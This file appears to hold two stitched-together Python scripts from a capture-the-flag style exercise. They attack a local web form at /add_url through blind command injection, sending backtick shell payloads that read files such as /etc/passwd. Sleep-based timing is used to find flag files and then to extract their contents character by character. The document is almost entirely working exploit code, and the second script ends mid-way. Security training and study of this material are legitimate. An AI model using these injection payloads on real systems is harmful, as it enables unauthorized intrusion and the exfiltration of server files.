import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload, desc=""):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text)
    except Exception as e:
        return 0, "ERROR", 0

print("[+] FINAL COMPREHENSIVE FLAG LOCATION FINDER")
print("="*70)

# The issue: file detection isn't working with conditionals
# Let me try: if the file exists, the whole command takes longer

def find_file_with_sleep(path, name):
    """Try multiple approaches to detect file"""
    results = {}
    
    # Approach 1: Direct cat with sleep on success
    p1 = f"`cat {path} 2>/dev/null && sleep 0.8 || true`"
    r1 = test(p1)
    results['cat_&&'] = r1[0]
    
    # Approach 2: Test -f in if statement
    p2 = f"`if [ -f {path} ]; then sleep 0.8; fi`"
    r2 = test(p2)
    results['if_fi'] = r2[0]
    
    # Approach 3: Test -f with arithmetic timing
    p3 = f"`[ -f {path} ] && sleep 0.8 || sleep 0`"
    r3 = test(p3)
    results['true_false'] = r3[0]
    
    # Approach 4: Try reading and counting (takes time if file exists)
    p4 = f"`cat {path} 2>/dev/null | wc -c | xargs -I{{}} sh -c '[ {{}} -gt 0 ] && sleep 0.8'`"
    r4 = test(p4)
    results['wc_c'] = r4[0]
    
    # Approach 5: Direct timing of file read
    start = time.time()
    p5 = f"`cat {path}`"
    test(p5)
    base_time = time.time() - start
    results['raw_cat'] = base_time
    
    return results, name

# Test known existing files to calibrate
calibration_files = [
    "/etc/passwd",
    "/etc/hosts",
    "/proc/version",
]

print("[CALIBRATION] Testing known existing files...")
for path in calibration_files:
    results, name = find_file_with_sleep(path, path)
    max_time = max(results.values())
    print(f"{path}: max_time={max_time:.2f}s, results={results}")

print("\n" + "="*70)
print("[FLAG HUNT] Testing potential flag locations...")

# Now test flag locations
flag_candidates = [
    "flag.txt",
    "/app/flag.txt",
    "/flag.txt",
    "flag",
    "/tmp/flag.txt",
    "../flag.txt",
    "../../flag.txt",
    "/home/user/flag.txt",
    "/opt/flag.txt",
    "/var/flag.txt",
    "FLAG.txt",
    "flag.php",
    "flag.json",
    "secrets.txt",
    ".flag",
    ".flag.txt",
]

found_flags = []

for path in flag_candidates:
    results, name = find_file_with_sleep(path, path)
    max_time = max(results.values())
    
    # If any test shows significant delay, flag might exist
    if max_time >= 0.7:
        print(f"[!] FOUND: {path} (max_time={max_time:.2f}s)")
        print(f"    Results: {results}")
        found_flags.append(path)
    else:
        print(f"    {path}: no detection ({max_time:.2f}s)")

print("\n" + "="*70)
print("[SUMMARY]")
if found_flags:
    print(f"[!] FLAG FILE(S) LIKELY AT: {found_flags}")
else:
    print("[!] No flag file detected in standard locations")
    print("[!] Possible reasons:")
    print("    1. Flag may be in an unusual location")
    print("    2. Flag may have an unexpected name")
    print("    3. File detection may be blocked at shell level")
    print("    4. Application may run in chroot/jail without access to flag")

# Try one more comprehensive search
print("\n" + "="*70)
print("[WILDCARD SEARCH] Searching for flag* files in common locations")

search_locations = ["/", "/app", "/tmp", "/home", "/opt", "/var", "/root", "."]

for loc in search_locations:
    # Use find with sleep if any matches
    payload = f"`find {loc} -maxdepth 3 -name 'flag*' -type f 2>/dev/null | head -1 | wc -l | xargs -I{{}} sh -c '[ {{}} -gt 0 ] && sleep 1'`"
    elapsed, status, length = test(payload)
    if elapsed >= 0.9:
        print(f"[!] FLAG* FOUND in {loc}: time={elapsed:.2f}s")
    else:
        print(f"    {loc}: no flag* found ({elapsed:.2f}s)")


import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload, timeout=10):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=timeout)
        elapsed = time.time() - start
        return elapsed, resp.status_code
    except Exception as e:
        return 0, "ERROR"

print("[+] CONFIRMED: flag.txt and /app/flag.txt EXIST")
print("[+] Now attempting content extraction via timing")
print("="*70)

# The file exists at both ./flag.txt and /app/flag.txt (probably the same path)
# Now let's try to extract content flag{...} character by character

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"

print("\n[PHASE 1] Verifying flag format starts with 'flag{' or 'FLAG{'")

# Test first 5 characters to confirm format
prefixes = ["flag{", "FLAG{", "CTF{", "ctf{", "pico{", "PICO{"]

for prefix in prefixes:
    # Check if file starts with this prefix
    prefix_len = len(prefix)
    payload = f"`head -c {prefix_len} flag.txt | grep -q ^{prefix} && sleep 1`"
    elapsed, status = test(payload)
    
    if elapsed >= 0.9:
        print(f"[!] Flag starts with: {prefix}")
        
# Now let's determine the exact path
print("\n[PHASE 2] Determining exact flag path")
path_tests = [
    ("`readlink -f flag.txt`", "flag.txt realpath"),
    ("`realpath flag.txt`", "flag.txt realpath"),
]

